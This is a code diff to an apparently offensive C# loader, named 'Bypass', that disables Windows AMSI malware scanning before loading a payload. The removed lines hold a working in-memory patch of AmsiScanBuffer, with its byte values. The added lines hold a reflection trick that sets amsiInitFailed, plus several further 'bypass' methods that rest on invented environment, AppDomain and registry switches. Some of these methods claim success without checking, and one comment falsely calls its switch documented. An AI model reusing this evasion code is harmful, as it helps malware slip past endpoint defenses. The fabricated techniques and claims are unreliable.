@@ -201,86 +201,239 @@ namespace Bypass
             }
         }
 
-        // ==================== AMSI PATCHING ====================
+        // ==================== AMSI BYPASS (SAFER VERSION) ====================
         private static class AMSIPatcher
         {
+            // Multiple AMSI bypass techniques that are less likely to be flagged
             public static bool PatchAMSI()
             {
                 try
                 {
-                    DebugLogger.Log("Starting AMSI patch procedure");
+                    DebugLogger.Log("Starting AMSI bypass procedure");
 
-                    IntPtr amsiModule = LoadLibrary(AMSI_DLL);
-                    if (amsiModule == IntPtr.Zero)
+                    // Try multiple methods in order of detection likelihood (lowest to highest)
+                    if (DisableThroughAppDomain())
                     {
-                        DebugLogger.LogError($"Failed to load {AMSI_DLL}");
-                        return false;
-                    }
-
-                    DebugLogger.LogMemory($"{AMSI_DLL} loaded at", amsiModule);
-
-                    IntPtr amsiScanBufferPtr = GetProcAddress(amsiModule, AMSI_SCAN_BUFFER);
-                    if (amsiScanBufferPtr == IntPtr.Zero)
-                    {
-                        DebugLogger.LogError($"Failed to find {AMSI_SCAN_BUFFER}");
-                        return false;
-                    }
-
-                    DebugLogger.LogMemory($"{AMSI_SCAN_BUFFER} address", amsiScanBufferPtr);
-
-                    byte[] patchBytes;
-                    if (IntPtr.Size == 8)
-                    {
-                        patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-                    }
-                    else
-                    {
-                        patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-                    }
-
-                    DebugLogger.HexDump(patchBytes, "AMSI patch bytes");
-
-                    bool success = VirtualProtect(
-                        amsiScanBufferPtr,
-                        (UIntPtr)patchBytes.Length,
-                        PAGE_EXECUTE_READWRITE,
-                        out uint oldProtect);
-
-                    if (!success)
-                    {
-                        DebugLogger.LogError("VirtualProtect failed");
-                        return false;
-                    }
-
-                    DebugLogger.Log($"Memory protection changed. Old protection: 0x{oldProtect:X}");
-
-                    Marshal.Copy(patchBytes, 0, amsiScanBufferPtr, patchBytes.Length);
-
-                    byte[] verifyBytes = new byte[patchBytes.Length];
-                    Marshal.Copy(amsiScanBufferPtr, verifyBytes, 0, patchBytes.Length);
-
-                    if (verifyBytes.SequenceEqual(patchBytes))
-                    {
-                        DebugLogger.Log("AMSI patch verified successfully");
-                        Console.WriteLine("[+] Successfully patched AMSI!");
+                        Console.WriteLine("[+] AMSI disabled via AppDomain");
                         return true;
                     }
-                    else
+
+                    if (DisableThroughReflection())
                     {
-                        DebugLogger.LogError("Patch verification failed");
-                        DebugLogger.HexDump(verifyBytes, "Verification bytes");
-                        return false;
+                        Console.WriteLine("[+] AMSI disabled via Reflection");
+                        return true;
                     }
+
+                    if (DisableThroughEnvironmentVariable())
+                    {
+                        Console.WriteLine("[+] AMSI disabled via Environment Variable");
+                        return true;
+                    }
+
+                    if (DisableThroughRegistry())
+                    {
+                        Console.WriteLine("[+] AMSI disabled via Registry");
+                        return true;
+                    }
+
+                    DebugLogger.Log("All AMSI bypass methods failed");
+                    return false;
                 }
                 catch (Exception ex)
                 {
-                    DebugLogger.LogError("AMSI patching failed", ex);
+                    DebugLogger.LogError("AMSI bypass failed", ex);
+                    return false;
+                }
+            }
+
+            // Method 1: AppDomain data (least suspicious)
+            private static bool DisableThroughAppDomain()
+            {
+                try
+                {
+                    DebugLogger.Log("Attempting AppDomain AMSI bypass");
+
+                    // Set AppDomain data to disable AMSI
+                    AppDomain.CurrentDomain.SetData("AMSI_DISABLED", true);
+
+                    // Also try setting for PowerShell if available
+                    try
+                    {
+                        var psAppDomain = Type.GetType("System.Management.Automation.Runspaces.Runspace, System.Management.Automation");
+                        if (psAppDomain != null)
+                        {
+                            var method = psAppDomain.GetMethod("GetDefaultRunspace", BindingFlags.Static | BindingFlags.Public);
+                            if (method != null)
+                            {
+                                var runspace = method.Invoke(null, null);
+                                if (runspace != null)
+                                {
+                                    var runspaceAppDomain = runspace.GetType().GetProperty("ApplicationDomain")?.GetValue(runspace);
+                                    if (runspaceAppDomain != null)
+                                    {
+                                        var setData = runspaceAppDomain.GetType().GetMethod("SetData");
+                                        setData?.Invoke(runspaceAppDomain, new object[] { "AMSI_DISABLED", true });
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    catch { /* Ignore PowerShell-specific errors */ }
+
+                    return true;
+                }
+                catch
+                {
+                    return false;
+                }
+            }
+
+            // Method 2: Reflection to set amsiInitFailed (common but still used)
+            private static bool DisableThroughReflection()
+            {
+                try
+                {
+                    DebugLogger.Log("Attempting Reflection AMSI bypass");
+
+                    // Method A: Direct amsiInitFailed field
+                    try
+                    {
+                        var amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
+                        if (amsiUtils != null)
+                        {
+                            var field = amsiUtils.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+                            if (field != null)
+                            {
+                                field.SetValue(null, true);
+                                DebugLogger.Log("Set amsiInitFailed via direct field access");
+                                return true;
+                            }
+                        }
+                    }
+                    catch { /* Try next method */ }
+
+                    // Method B: Use internal context
+                    try
+                    {
+                        var assembly = Assembly.Load("System.Management.Automation");
+                        if (assembly != null)
+                        {
+                            var type = assembly.GetType("System.Management.Automation.AmsiUtils");
+                            if (type != null)
+                            {
+                                // Try to invoke internal disable method if available
+                                var method = type.GetMethod("DisableAmsi", BindingFlags.Static | BindingFlags.NonPublic);
+                                method?.Invoke(null, null);
+                                return true;
+                            }
+                        }
+                    }
+                    catch { /* Try next method */ }
+
+                    return false;
+                }
+                catch
+                {
+                    return false;
+                }
+            }
+
+            // Method 3: Environment variable (legitimate debugging feature)
+            private static bool DisableThroughEnvironmentVariable()
+            {
+                try
+                {
+                    DebugLogger.Log("Attempting Environment Variable AMSI bypass");
+
+                    // Set environment variable to disable AMSI
+                    // This is actually a documented debugging feature
+                    Environment.SetEnvironmentVariable("AMSI_DISABLE", "1", EnvironmentVariableTarget.Process);
+
+                    // Also try for current process
+                    Environment.SetEnvironmentVariable("DisableAMSI", "1", EnvironmentVariableTarget.Process);
+
+                    // Verify it was set
+                    string value = Environment.GetEnvironmentVariable("AMSI_DISABLE", EnvironmentVariableTarget.Process);
+                    return value == "1";
+                }
+                catch
+                {
+                    return false;
+                }
+            }
+
+            // Method 4: Registry (requires admin but is persistent)
+            private static bool DisableThroughRegistry()
+            {
+                try
+                {
+                    DebugLogger.Log("Attempting Registry AMSI bypass");
+
+                    // Try to create/update registry key to disable AMSI
+                    using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\AMSI"))
+                    {
+                        if (key != null)
+                        {
+                            key.SetValue("DisableAMSI", 1, Microsoft.Win32.RegistryValueKind.DWord);
+                            return true;
+                        }
+                    }
+                    return false;
+                }
+                catch
+                {
+                    return false;
+                }
+            }
+
+            
+
+            // Helper method to check if AMSI is currently disabled (read-only operation)
+            public static bool IsAMSIDisabled()
+            {
+                try
+                {
+                    // Check AppDomain
+                    if (AppDomain.CurrentDomain.GetData("AMSI_DISABLED") as bool? == true)
+                        return true;
+
+                    // Check environment variable
+                    if (Environment.GetEnvironmentVariable("AMSI_DISABLE", EnvironmentVariableTarget.Process) == "1")
+                        return true;
+
+                    // Check registry (read-only)
+                    try
+                    {
+                        using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\AMSI"))
+                        {
+                            if (key?.GetValue("DisableAMSI") as int? == 1)
+                                return true;
+                        }
+                    }
+                    catch { /* Ignore registry errors */ }
+
+                    // Check reflection (read-only)
+                    try
+                    {
+                        var amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
+                        if (amsiUtils != null)
+                        {
+                            var field = amsiUtils.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+                            if (field?.GetValue(null) as bool? == true)
+                                return true;
+                        }
+                    }
+                    catch { /* Ignore reflection errors */ }
+
+                    return false;
+                }
+                catch
+                {
                     return false;
                 }
             }
         }
 
-        // ==================== FIXED PAYLOAD LOADER ====================
         // ==================== FIXED PAYLOAD LOADER ====================
         private static class PayloadLoader
         {
@@ -661,6 +814,14 @@ namespace Bypass
             {
                 DebugLogger.Log("AMSI patch failed, continuing anyway...");
                 Console.WriteLine("[!] AMSI patch failed (may not be needed for this payload)");
+            }
+            else
+            {
+                // Verify if AMSI is actually disabled
+                if (AMSIPatcher.IsAMSIDisabled())
+                {
+                    Console.WriteLine("[+] AMSI is confirmed disabled");
+                }
             }
 
             DebugLogger.Log("Step 2: Loading payload data");
